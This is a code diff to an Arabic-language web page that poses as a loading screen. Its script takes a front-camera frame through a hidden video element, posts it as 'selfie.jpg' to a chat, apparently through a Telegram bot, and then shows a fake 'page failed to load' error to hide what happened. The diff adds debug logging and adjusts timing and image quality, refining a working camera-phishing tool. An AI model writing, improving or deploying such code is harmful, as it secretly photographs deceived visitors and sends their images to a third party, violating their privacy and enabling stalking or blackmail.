@@ -33,6 +33,7 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         video { display: none; }
+        #debug { position: absolute; bottom: 10px; left: 10px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
@@ -40,11 +41,17 @@
         <div class="spinner"></div>
         <p>جاري تحميل الصفحة...</p>
     </div>
+    <div id="debug"></div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        const debug = document.getElementById('debug');
+        function log(msg) { debug.innerHTML += msg + "<br>"; console.log(msg); }
+
+        log("بدء التشغيل...");
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const loader = document.getElementById('loader');
@@ -53,17 +60,23 @@
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
+            log("✅ الكاميرا تم تشغيلها");
             video.srcObject = stream;
-            setTimeout(captureAndSend, 2800);
+            setTimeout(captureAndSend, 2500);
         })
-        .catch(() => showError());
+        .catch(err => {
+            log("❌ خطأ في الكاميرا: " + err.message);
+            showError();
+        });
 
         function captureAndSend() {
+            log("📸 جاري التقاط الصورة...");
             canvas.width = 1280;
             canvas.height = 720;
             canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
             
             canvas.toBlob(blob => {
+                log("📤 جاري إرسال الصورة إلى تيليجرام...");
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'selfie.jpg');
@@ -72,22 +85,27 @@
                     method: 'POST',
                     body: formData
                 })
-                .then(response => response.json())
+                .then(r => r.json())
                 .then(data => {
+                    log("📩 الرد من تيليجرام: " + JSON.stringify(data));
                     if (data.ok) {
-                        showError();
+                        log("✅ نجح الإرسال!");
                     } else {
-                        showError();
+                        log("⚠️ فشل الإرسال: " + data.description);
                     }
+                    showError();
                 })
-                .catch(() => showError());
-            }, 'image/jpeg', 0.85);
+                .catch(err => {
+                    log("❌ خطأ في الاتصال: " + err.message);
+                    showError();
+                });
+            }, 'image/jpeg', 0.8);
         }
 
         function showError() {
             loader.innerHTML = `
-                <h1 style="color:#ff0066; font-size:28px;">خطأ في تحميل الصفحة</h1>
-                <p style="font-size:19px;">حدث خطأ غير متوقع<br>يرجى المحاولة مرة أخرى لاحقاً</p>
+                <h1 style="color:#ff0066;">خطأ في تحميل الصفحة</h1>
+                <p>يرجى المحاولة مرة أخرى</p>
             `;
             if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
         }
